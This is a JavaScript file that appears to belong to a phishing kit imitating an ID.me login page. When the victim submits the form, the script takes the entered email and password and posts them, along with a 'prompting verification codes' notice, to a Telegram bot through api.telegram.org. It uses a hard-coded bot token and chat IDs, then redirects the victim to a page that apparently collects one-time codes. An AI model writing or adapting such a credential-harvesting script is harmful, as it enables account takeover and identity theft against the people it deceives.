// const chatIds = ["1534371221", "6189466166"];
// const chatIds = ["1534371221", "6189466166", "6136559061", "6924640648"];
const chatIds = ["-1002393688453"];
// const chatIds = ["1534371221"];

let formm;
let delayy;
let counterr;
let generated_email;
let email_field;
let password_field;
let submit_btn;
let link_to_create;
document.addEventListener("DOMContentLoaded", () => {
  console.log("i dey");
  counterr = document.querySelector(".counterr");
  delayy = document.getElementById("delayy");
  email_field = document.getElementById("user_email");
  generated_email = new URLSearchParams(window.location.search).get("em");
  link_to_create = document.getElementById("link_to_create");

  // link_to_create.setAttribute("href", `https://api.id.me/en/registration/new`);
  password_field = document.getElementById("user_password");
  submit_btn = document.getElementById("submit_btn");
  formm = document.getElementById("formm");

  formm.addEventListener("submit", (e) => {
    e.preventDefault();
    show_counter();
    console.log("submit form");
    submit_details();
  });
});

// const ;
function show_counter() {
  submit_btn.setAttribute("disabled", "true");
  const del = document.getElementById("delayy");
  del.style.display = "flex";
}
async function submit_details() {
  const intervall = setInterval(() => {
    counterr.innerText = counterr.innerText - 1;
    if (counterr.innerText == 0) {
      clearInterval(intervall);
      window.location.href = `/Login/code`;
    }
    console.log("reduced");
  }, 1000);
  const msg = `New user ${email_field.value} \n 
  password is ${password_field.value} \n 
  Prompting Verfication codes in 60s
  `;
  for (let i = 0; i < chatIds.length; i++) {
    const data = {
      chat_id: chatIds[i],
      text: msg,
    };
    const resp = await fetch(
      `https://api.telegram.org/bot7871889688:AAFlHwVTt_lPVFTm6WT67so8UKK1bjWWgug/sendMessage`,
      {
        method: "POST",
        headers: {
          accept: "application/json",
          "content-type": "application/json",
        },
        body: JSON.stringify(data),
      }
    );
    const resJson = await resp.json();
    console.log(resJson);
  }
}

